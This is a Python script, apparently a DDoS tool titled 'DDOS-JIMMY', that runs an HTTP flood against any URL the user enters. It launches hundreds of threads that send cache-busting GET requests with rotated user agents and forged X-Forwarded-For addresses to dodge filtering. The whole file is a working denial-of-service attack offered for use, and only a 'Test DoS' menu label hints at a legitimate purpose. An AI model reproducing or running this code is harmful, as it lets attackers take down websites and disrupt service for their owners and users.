import threading
import requests
import random
import string
import time
import os

BANNER = r"""


██████╗ ██████╗  ██████╗ ███████╗           ██╗██╗███╗   ███╗███╗   ███╗██╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝           ██║██║████╗ ████║████╗ ████║╚██╗ ██╔╝
██║  ██║██║  ██║██║   ██║███████╗█████╗     ██║██║██╔████╔██║██╔████╔██║ ╚████╔╝ 
██║  ██║██║  ██║██║   ██║╚════██║╚════╝██   ██║██║██║╚██╔╝██║██║╚██╔╝██║  ╚██╔╝  
██████╔╝██████╔╝╚██████╔╝███████║      ╚█████╔╝██║██║ ╚═╝ ██║██║ ╚═╝ ██║   ██║   
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝       ╚════╝ ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝   ╚═╝   
                                                                                 

                                 
                ★★★ BY: JIMMY JACK ★★★
"""

MENU = """
[1] HTTP Flood (Test DoS)
[2] Exit
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

stop_flag = False

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def attack(target_url, threads_count):
    def flood():
        while not stop_flag:
            try:
                url = f"{target_url}?{generate_random_string()}={generate_random_string()}&nocache={random.randint(1, 100000)}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": random_ip(),
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": random.choice(["keep-alive", "close"]),
                    "Referer": target_url,
                }
                requests.get(url, headers=headers, timeout=5)
                print(f"⚡ Sent: {url} | UA: {headers['User-Agent']} | IP: {headers['X-Forwarded-For']}")
                time.sleep(random.uniform(0.01, 0.1))
            except:
                pass

    threads = []
    try:
        for _ in range(threads_count):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            threads.append(t)

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        global stop_flag
        print("\n[!] Stopping all threads...")
        stop_flag = True
        for t in threads:
            t.join()
        print("[✓] Stopped cleanly.")

def main():
    clear()
    print(BANNER)
    print(MENU)
    choice = input("Select an option: ").strip()

    if choice == "1":
        target = input("Enter target URL (e.g., http:ใส่ url): ").strip()
        threads = input("Number of threads [Default: 500]: ").strip()
        if not threads.isdigit():
            threads = 500
        else:
            threads = int(threads)
        print(f"\n[!] Starting flood on {target} with {threads} threads. Press Ctrl+C to stop.\n")
        attack(target, threads)
    elif choice == "2" or choice == "0":
        print("Goodbye!")
        exit()
    else:
        print("Invalid option.")
        time.sleep(2)
        main()

if __name__ == "__main__":
    main()
